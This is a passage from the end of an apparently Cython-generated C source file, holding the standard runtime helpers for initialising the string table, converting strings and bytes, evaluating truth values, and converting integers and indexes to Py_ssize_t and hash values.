    if (t.is_unicode | t.is_str) {
        if (t.intern) {
            *str = PyUnicode_InternFromString(t.s);
        } else if (t.encoding) {
            *str = PyUnicode_Decode(t.s, t.n - 1, t.encoding, NULL);
        } else {
            *str = PyUnicode_FromStringAndSize(t.s, t.n - 1);
        }
    } else {
        *str = PyBytes_FromStringAndSize(t.s, t.n - 1);
    }
    if (!*str)
        return -1;
    if (PyObject_Hash(*str) == -1)
        return -1;
    return 0;
}
#endif
static int __Pyx_InitStrings(__Pyx_StringTabEntry *t) {
    while (t->p) {
        #if PY_MAJOR_VERSION >= 3
        __Pyx_InitString(*t, t->p);
        #else
        if (t->is_unicode) {
            *t->p = PyUnicode_DecodeUTF8(t->s, t->n - 1, NULL);
        } else if (t->intern) {
            *t->p = PyString_InternFromString(t->s);
        } else {
            *t->p = PyString_FromStringAndSize(t->s, t->n - 1);
        }
        if (!*t->p)
            return -1;
        if (PyObject_Hash(*t->p) == -1)
            return -1;
        #endif
        ++t;
    }
    return 0;
}

#include <string.h>
static CYTHON_INLINE Py_ssize_t __Pyx_ssize_strlen(const char *s) {
    size_t len = strlen(s);
    if (unlikely(len > (size_t) PY_SSIZE_T_MAX)) {
        PyErr_SetString(PyExc_OverflowError, "byte string is too long");
        return -1;
    }
    return (Py_ssize_t) len;
}
static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char* c_str) {
    Py_ssize_t len = __Pyx_ssize_strlen(c_str);
    if (unlikely(len < 0)) return NULL;
    return __Pyx_PyUnicode_FromStringAndSize(c_str, len);
}
static CYTHON_INLINE PyObject* __Pyx_PyByteArray_FromString(const char* c_str) {
    Py_ssize_t len = __Pyx_ssize_strlen(c_str);
    if (unlikely(len < 0)) return NULL;
    return PyByteArray_FromStringAndSize(c_str, len);
}
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject* o) {
    Py_ssize_t ignore;
    return __Pyx_PyObject_AsStringAndSize(o, &ignore);
}
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
#if !CYTHON_PEP393_ENABLED
static const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
    char* defenc_c;
    PyObject* defenc = _PyUnicode_AsDefaultEncodedString(o, NULL);
    if (!defenc) return NULL;
    defenc_c = PyBytes_AS_STRING(defenc);
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    {
        char* end = defenc_c + PyBytes_GET_SIZE(defenc);
        char* c;
        for (c = defenc_c; c < end; c++) {
            if ((unsigned char) (*c) >= 128) {
                PyUnicode_AsASCIIString(o);
                return NULL;
            }
        }
    }
#endif
    *length = PyBytes_GET_SIZE(defenc);
    return defenc_c;
}
#else
static CYTHON_INLINE const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
    if (unlikely(__Pyx_PyUnicode_READY(o) == -1)) return NULL;
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    if (likely(PyUnicode_IS_ASCII(o))) {
        *length = PyUnicode_GET_LENGTH(o);
        return PyUnicode_AsUTF8(o);
    } else {
        PyUnicode_AsASCIIString(o);
        return NULL;
    }
#else
    return PyUnicode_AsUTF8AndSize(o, length);
#endif
}
#endif
#endif
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
    if (
#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
            __Pyx_sys_getdefaultencoding_not_ascii &&
#endif
            PyUnicode_Check(o)) {
        return __Pyx_PyUnicode_AsStringAndSize(o, length);
    } else
#endif
#if (!CYTHON_COMPILING_IN_PYPY && !CYTHON_COMPILING_IN_LIMITED_API) || (defined(PyByteArray_AS_STRING) && defined(PyByteArray_GET_SIZE))
    if (PyByteArray_Check(o)) {
        *length = PyByteArray_GET_SIZE(o);
        return PyByteArray_AS_STRING(o);
    } else
#endif
    {
        char* result;
        int r = PyBytes_AsStringAndSize(o, &result, length);
        if (unlikely(r < 0)) {
            return NULL;
        } else {
            return result;
        }
    }
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject* x) {
   int is_true = x == Py_True;
   if (is_true | (x == Py_False) | (x == Py_None)) return is_true;
   else return PyObject_IsTrue(x);
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject* x) {
    int retval;
    if (unlikely(!x)) return -1;
    retval = __Pyx_PyObject_IsTrue(x);
    Py_DECREF(x);
    return retval;
}
static PyObject* __Pyx_PyNumber_IntOrLongWrongResultType(PyObject* result, const char* type_name) {
    __Pyx_TypeName result_type_name = __Pyx_PyType_GetName(Py_TYPE(result));
#if PY_MAJOR_VERSION >= 3
    if (PyLong_Check(result)) {
        if (PyErr_WarnFormat(PyExc_DeprecationWarning, 1,
                "__int__ returned non-int (type " __Pyx_FMT_TYPENAME ").  "
                "The ability to return an instance of a strict subclass of int is deprecated, "
                "and may be removed in a future version of Python.",
                result_type_name)) {
            __Pyx_DECREF_TypeName(result_type_name);
            Py_DECREF(result);
            return NULL;
        }
        __Pyx_DECREF_TypeName(result_type_name);
        return result;
    }
#endif
    PyErr_Format(PyExc_TypeError,
                 "__%.4s__ returned non-%.4s (type " __Pyx_FMT_TYPENAME ")",
                 type_name, type_name, result_type_name);
    __Pyx_DECREF_TypeName(result_type_name);
    Py_DECREF(result);
    return NULL;
}
static CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x) {
#if CYTHON_USE_TYPE_SLOTS
  PyNumberMethods *m;
#endif
  const char *name = NULL;
  PyObject *res = NULL;
#if PY_MAJOR_VERSION < 3
  if (likely(PyInt_Check(x) || PyLong_Check(x)))
#else
  if (likely(PyLong_Check(x)))
#endif
    return __Pyx_NewRef(x);
#if CYTHON_USE_TYPE_SLOTS
  m = Py_TYPE(x)->tp_as_number;
  #if PY_MAJOR_VERSION < 3
  if (m && m->nb_int) {
    name = "int";
    res = m->nb_int(x);
  }
  else if (m && m->nb_long) {
    name = "long";
    res = m->nb_long(x);
  }
  #else
  if (likely(m && m->nb_int)) {
    name = "int";
    res = m->nb_int(x);
  }
  #endif
#else
  if (!PyBytes_CheckExact(x) && !PyUnicode_CheckExact(x)) {
    res = PyNumber_Int(x);
  }
#endif
  if (likely(res)) {
#if PY_MAJOR_VERSION < 3
    if (unlikely(!PyInt_Check(res) && !PyLong_Check(res))) {
#else
    if (unlikely(!PyLong_CheckExact(res))) {
#endif
        return __Pyx_PyNumber_IntOrLongWrongResultType(res, name);
    }
  }
  else if (!PyErr_Occurred()) {
    PyErr_SetString(PyExc_TypeError,
                    "an integer is required");
  }
  return res;
}
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject* b) {
  Py_ssize_t ival;
  PyObject *x;
#if PY_MAJOR_VERSION < 3
  if (likely(PyInt_CheckExact(b))) {
    if (sizeof(Py_ssize_t) >= sizeof(long))
        return PyInt_AS_LONG(b);
    else
        return PyInt_AsSsize_t(b);
  }
#endif
  if (likely(PyLong_CheckExact(b))) {
    #if CYTHON_USE_PYLONG_INTERNALS
    if (likely(__Pyx_PyLong_IsCompact(b))) {
        return __Pyx_PyLong_CompactValue(b);
    } else {
      const digit* digits = __Pyx_PyLong_Digits(b);
      const Py_ssize_t size = __Pyx_PyLong_SignedDigitCount(b);
      switch (size) {
         case 2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
      }
    }
    #endif
    return PyLong_AsSsize_t(b);
  }
  x = PyNumber_Index(b);
  if (!x) return -1;
  ival = PyInt_AsSsize_t(x);
  Py_DECREF(x);
  return ival;
}
static CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject* o) {
  if (sizeof(Py_hash_t) == sizeof(Py_ssize_t)) {
    return (Py_hash_t) __Pyx_PyIndex_AsSsize_t(o);
#if PY_MAJOR_VERSION < 3
  } else if (likely(PyInt_CheckExact(o))) {
    return PyInt_AS_LONG(o);
#endif
  } else {
    Py_ssize_t ival;
    PyObject *x;
    x = PyNumber_Index(o);
    if (!x) return -1;
    ival = PyInt_AsLong(x);
    Py_DECREF(x);
    return ival;
  }
}
static CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b) {
  return b ? __Pyx_NewRef(Py_True) : __Pyx_NewRef(Py_False);
}
static CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t ival) {
    return PyInt_FromSize_t(ival);
}


/* #### Code section: utility_code_pragmas_end ### */
#ifdef _MSC_VER
#pragma warning( pop )
#endif



/* #### Code section: end ### */
#endif /* Py_PYTHON_H */
